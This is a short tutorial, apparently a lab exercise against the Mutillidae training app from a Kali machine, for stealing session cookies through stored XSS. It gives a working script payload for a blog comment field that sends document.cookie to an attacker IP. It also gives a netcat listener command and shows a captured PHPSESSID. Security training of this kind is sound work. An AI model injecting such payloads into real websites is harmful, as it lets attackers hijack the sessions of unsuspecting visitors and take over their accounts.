### 💉  Inject Stored XSS Payload

In the blog comment field, paste the following code and submit:

```html
<script>
  var i = new Image();
  i.src = "http://192.168.***.***:5000?" + document.cookie;
</script>




💻  Open Listener on Kali (Attacker Machine)
On the Kali terminal, run:

nc -lvp 5000
You're now listening for incoming HTTP requests on port 5000.

👁️ View the Victim Blog Page
Open this page from another browser or machine to simulate a victim visiting the infected blog:


http://192.168.237.131/mutillidae/index.php?page=view-someones-blog.php

🕵️‍♂️  Get the Cookie
On your Kali terminal (where Netcat is listening), you'll see something like:


connect to [192.168.237.130] from (UNKNOWN) [192.168.237.1] 23946
GET /?PHPSESSID=abcdef123456789 HTTP/1.1

Boom! You got their session cookie 🥳
